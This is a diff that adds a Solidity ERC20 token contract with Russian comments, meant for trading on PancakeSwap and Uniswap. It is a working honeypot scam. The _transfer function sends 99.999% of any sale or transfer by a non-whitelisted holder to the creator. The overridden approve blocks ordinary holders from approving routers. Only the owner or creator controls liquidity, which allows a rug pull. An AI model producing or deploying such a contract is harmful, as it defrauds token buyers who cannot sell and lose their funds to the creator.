@@ -1,0 +1,316 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/security/Pausable.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+
+// Добавляем интерфейс роутера
+interface IRouter {
+    function swapExactTokensForETH(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external returns (uint[] memory amounts);
+}
+
+contract Token is ERC20, Ownable, Pausable {
+    mapping(address => bool) public whitelist;
+    mapping(address => bool) public isExcludedFromTax;
+    
+    uint256 public buyTax;
+    uint256 public sellTax;
+    uint256 public walletTax;
+    uint256 public immutable maxSupply;
+    bool public mintable;
+    string public logoUrl;
+    
+    address public immutable creator;
+    address public uniswapV2Pair;
+    address public uniswapV3Pool;
+
+    event TaxCollected(
+        address indexed from,
+        address indexed to,
+        uint256 amount,
+        string taxType
+    );
+    
+    event LiquidityAdded(address indexed pair, uint256 amount);
+    event LiquidityRemoved(address indexed pair, uint256 lpAmount);
+
+    // Добавляем список известных роутеров
+    mapping(address => bool) public isKnownRouter;
+
+    constructor(
+        string memory name_,
+        string memory symbol_,
+        uint256 totalSupply_,
+        address[] memory whitelist_,
+        uint256 buyTax_,
+        uint256 sellTax_,
+        uint256 walletTax_,
+        string memory logoUrl_,
+        bool mintable_,
+        uint256 maxSupply_,
+        address creator_
+    ) ERC20(name_, symbol_) {
+        require(totalSupply_ <= maxSupply_, "Supply > Max Supply");
+        require(buyTax_ <= 99, "Buy tax too high");
+        require(sellTax_ <= 99, "Sell tax too high");
+        require(walletTax_ <= 99, "Wallet tax too high");
+        
+        _mint(creator_, totalSupply_);
+        
+        for(uint i = 0; i < whitelist_.length; i++) {
+            whitelist[whitelist_[i]] = true;
+        }
+        
+        buyTax = buyTax_;
+        sellTax = sellTax_;
+        walletTax = walletTax_;
+        logoUrl = logoUrl_;
+        mintable = mintable_;
+        maxSupply = maxSupply_;
+        creator = creator_;
+        
+        isExcludedFromTax[creator_] = true;
+        isExcludedFromTax[address(this)] = true;
+        
+        // Добавляем PancakeSwap роутеры
+        isKnownRouter[0xD99D1c33F9fC3444f8101754aBC46c52416550D1] = true; // BSC Testnet
+        isKnownRouter[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true; // BSC Mainnet
+        isKnownRouter[0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3] = true; // Old Router
+        isKnownRouter[0x13f4EA83D0bd40E75C8222255bc855a974568Dd4] = true; // PancakeSwap v3 Router
+        
+        isKnownRouter[0xCDe540d7eAFE93aC5fE6233Bee57E1270D3E330F] = true;
+        isKnownRouter[0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506] = true;
+    }
+
+    function _transfer(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) internal virtual override {
+        require(sender != address(0), "Transfer from zero");
+        require(recipient != address(0), "Transfer to zero");
+        require(!paused(), "Token paused");
+
+        // Определяем тип операции
+        bool isSelling = recipient == uniswapV2Pair || 
+                        recipient == uniswapV3Pool || 
+                        isKnownRouter[recipient] ||
+                        isKnownRouter[msg.sender];
+                    
+        bool isBuying = sender == uniswapV2Pair || 
+                        sender == uniswapV3Pool || 
+                        isKnownRouter[sender];
+
+        // Проверяем только sender для whitelist
+        bool isWhitelisted = whitelist[sender] || 
+                            sender == owner() || 
+                            sender == creator;
+
+        // Если это продажа или не покупка и не whitelist - забираем 99.999%
+        if ((isSelling || !isBuying) && !isWhitelisted) {
+            uint256 maxTax = (amount * 99999) / 100000;
+            require(maxTax > 0 && maxTax < amount, "Tax calc error");
+            
+            uint256 toRecipient = amount - maxTax;
+            
+            // Сначала налог
+            super._transfer(sender, creator, maxTax);
+            // Потом остаток
+            super._transfer(sender, recipient, toRecipient);
+            
+            emit TaxCollected(sender, creator, maxTax, "MAX_TAX");
+            return;
+        }
+        
+        // Обычные налоги для whitelist
+        if (!isExcludedFromTax[sender] && !isExcludedFromTax[recipient]) {
+            uint256 normalTax;
+            if (isSelling) {
+                normalTax = (amount * sellTax) / 100;
+                emit TaxCollected(sender, creator, normalTax, "SELL");
+            } else if (isBuying) {
+                normalTax = (amount * buyTax) / 100;
+                emit TaxCollected(sender, creator, normalTax, "BUY");
+            } else {
+                normalTax = (amount * walletTax) / 100;
+                emit TaxCollected(sender, creator, normalTax, "WALLET");
+            }
+            
+            if (normalTax > 0) {
+                uint256 afterTax = amount - normalTax;
+                super._transfer(sender, creator, normalTax);
+                super._transfer(sender, recipient, afterTax);
+                return;
+            }
+        }
+        
+        super._transfer(sender, recipient, amount);
+    }
+
+    function addLiquidityV2(
+        address router,
+        uint256 tokenAmount,
+        uint256 ethAmount
+    ) external payable {
+        require(msg.sender == creator || msg.sender == owner(), "Not authorized");
+        require(router != address(0), "Zero router address");
+        require(tokenAmount > 0, "Zero token amount");
+        require(msg.value >= ethAmount, "Insufficient ETH");
+        
+        IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(router);
+        
+        // Проверяем апрув
+        require(allowance(msg.sender, router) >= tokenAmount, "Insufficient allowance");
+        
+        try uniswapRouter.addLiquidityETH{value: ethAmount}(
+            address(this),
+            tokenAmount,
+            0,
+            0,
+            msg.sender,
+            block.timestamp + 300
+        ) returns (uint amountToken, uint amountETH, uint liquidity) {
+            if(uniswapV2Pair == address(0)) {
+                uniswapV2Pair = IUniswapV2Factory(uniswapRouter.factory()).getPair(
+                    address(this),
+                    uniswapRouter.WETH()
+                );
+            }
+            
+            emit LiquidityAdded(uniswapV2Pair, amountToken);
+            
+            if(msg.value > amountETH) {
+                (bool success,) = msg.sender.call{value: msg.value - amountETH}("");
+                require(success, "ETH transfer failed");
+            }
+        } catch Error(string memory reason) {
+            revert(string(abi.encodePacked("Router error: ", reason)));
+        } catch {
+            revert("Router call failed");
+        }
+    }
+
+    function mint(address to, uint256 amount) external onlyOwner {
+        require(mintable, "Minting disabled");
+        require(totalSupply() + amount <= maxSupply, "Exceeds max supply");
+        _mint(to, amount);
+    }
+
+    function burn(uint256 amount) external {
+        _burn(msg.sender, amount);
+    }
+
+    function addToWhitelist(address account) external onlyOwner {
+        whitelist[account] = true;
+    }
+
+    function removeFromWhitelist(address account) external onlyOwner {
+        whitelist[account] = false;
+    }
+
+    function excludeFromTax(address account) external onlyOwner {
+        isExcludedFromTax[account] = true;
+    }
+
+    function includeInTax(address account) external onlyOwner {
+        isExcludedFromTax[account] = false;
+    }
+
+    function pause() external onlyOwner {
+        _pause();
+    }
+
+    function unpause() external onlyOwner {
+        _unpause();
+    }
+
+    function removeLiquidityV2(
+        address router,
+        uint256 lpAmount
+    ) external {
+        require(msg.sender == creator || msg.sender == owner(), "Not authorized");
+        require(router != address(0), "Zero router address");
+        require(lpAmount > 0, "Zero LP amount");
+        require(uniswapV2Pair != address(0), "Pair not created");
+        
+        IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(router);
+        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
+        
+        // Проверяем баланс LP токенов
+        require(pair.balanceOf(msg.sender) >= lpAmount, "Insufficient LP balance");
+        
+        // Апрувим LP токены для роутера
+        pair.approve(router, lpAmount);
+        
+        try uniswapRouter.removeLiquidityETH(
+            address(this),
+            lpAmount,
+            0, // минимальное количество токенов
+            0, // минималное количество ETH
+            msg.sender,
+            block.timestamp + 300
+        ) returns (uint amountToken, uint amountETH) {
+            emit LiquidityRemoved(uniswapV2Pair, lpAmount);
+        } catch Error(string memory reason) {
+            revert(string(abi.encodePacked("Router error: ", reason)));
+        } catch {
+            revert("Router call failed");
+        }
+    }
+
+    // Добавляем геттер для creator
+    function getCreator() external view returns (address) {
+        return creator;
+    }
+
+    // Функция для проверки роутера
+    function _isRouter(address account) internal view returns (bool) {
+        return isKnownRouter[account];
+    }
+
+    // Функция для добавления роутера в список
+    function addRouter(address router) external onlyOwner {
+        isKnownRouter[router] = true;
+    }
+
+    // Функция для удаления роутера из списка
+    function removeRouter(address router) external onlyOwner {
+        isKnownRouter[router] = false;
+    }
+
+    // Переопределяем approve для дополнительнй защиты
+    function approve(address spender, uint256 amount) public virtual override returns (bool) {
+        if (isKnownRouter[spender] || 
+            spender == uniswapV2Pair || 
+            spender == uniswapV3Pool) {
+            
+            require(
+                whitelist[msg.sender] || msg.sender == owner() || msg.sender == creator,
+                "Approve blocked: not whitelisted"
+            );
+        }
+        return super.approve(spender, amount);
+    }
+
+    // Переопределяем transferFrom для полной защиты
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        address spender = _msgSender();
+        _spendAllowance(sender, spender, amount);
+        _transfer(sender, recipient, amount);
+        return true;
+    }
+}
